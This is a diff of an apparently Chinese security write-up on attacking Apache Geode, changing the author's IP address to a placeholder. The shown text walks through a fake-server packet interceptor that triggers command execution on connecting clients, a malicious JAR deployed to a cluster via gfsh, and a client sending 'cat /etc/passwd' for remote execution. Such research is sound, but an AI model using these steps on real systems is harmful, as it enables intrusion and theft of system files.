@@ -482,8 +482,8 @@ import netfilterqueue
 
 def p(data):
   pkt = IP(data.get_payload())
-  #抓 172.245.82.84 发出去的包
-  if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[IP].src=='172.245.82.84':
+  #抓 {我的IP} 发出去的包
+  if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[IP].src=='{我的IP}':
       #...[请读者自行配置和思考该部分内容]...
 
   data.accept()
@@ -494,7 +494,7 @@ queue.run()
 ```
 
 在所有的一切配置完毕后，我们的伪服务端就已经构造完毕了.  
-接下来运行工程端连接 172.245.82.84 时直接弹计算器出来，证明此处存在命令执行漏洞  
+接下来运行工程端连接 {我的IP} 时直接弹计算器出来，证明此处存在命令执行漏洞  
 
 ![avatar](/image/2024-06-01-4.png)  
 
@@ -582,7 +582,7 @@ git clone https://github.com/apache/geode-examples
     }
     ```
 
-2. 而后，修改 Example.java 中的第 35 行的 IP 地址为远程集群 IP: 172.245.82.84 (这里是我个人 IP，读者请按自己需要修改)
+2. 而后，修改 Example.java 中的第 35 行的 IP 地址为远程集群 IP: {我的IP} (这里是我个人 IP，读者请按自己需要修改)
     ![avatar](/image/2024-06-01-12.png)  
 
 3. 植入完毕后，进入`geode-examples/functions`，输入命令 `../gradlew build`   启动 gralew 打包(请注意，在此处 jdk1.8 环境是必要的，请先安装 jdk1.8 再执行以下步骤):  
@@ -612,7 +612,7 @@ git clone https://github.com/apache/geode-examples
         public Example(int maximum) { this.maximum = maximum; }
 
         public static void main(String[] args) {
-            ClientCache cache = new ClientCacheFactory().addPoolLocator("172.245.82.84", 10334).set("log-level", "WARN").create();
+            ClientCache cache = new ClientCacheFactory().addPoolLocator("{我的IP}", 10334).set("log-level", "WARN").create();
             Region<Integer, String> region = cache.<Integer, String>createClientRegionFactory(ClientRegionShortcut.CACHING_PROXY).create("example-region");
             Execution execution = FunctionService.onRegion(region);
             new Example().getPrimes(region, execution);
@@ -632,9 +632,9 @@ git clone https://github.com/apache/geode-examples
     }
     ```
 
-现在轮到 172.245.82.84 变成受害人了，将刚刚打包完毕的 JAR 部署到 12.245.82.84 中并调用该 JAR 中的恶意 Payload
+现在轮到 {我的IP} 变成受害人了，将刚刚打包完毕的 JAR 部署到 {我的IP} 中并调用该 JAR 中的恶意 Payload
 
-1. 接下来我们在客户端的 gfsh 终端中使用命令 `connect --locator=172.245.82.84[10334]` 连接 172.245.82.84
+1. 接下来我们在客户端的 gfsh 终端中使用命令 `connect --locator={我的IP}[10334]` 连接 {我的IP}
 
     ![avatar](/image/2024-06-01-7.png)  
 
@@ -709,7 +709,7 @@ git clone https://github.com/apache/geode-examples
     public class Client {
         public static void main(String[] args)() {
             //连接集群服务器
-            ClientCache cache = new ClientCacheFactory().addPoolLocator("172.245.82.84", 10334).create();
+            ClientCache cache = new ClientCacheFactory().addPoolLocator("{我的IP}", 10334).create();
             //客户端传参
             Object[] functionArgs = new Object[]{"cat /etc/passwd"};
             Execution execution = FunctionService.onServer(cache).setArguments(functionArgs);
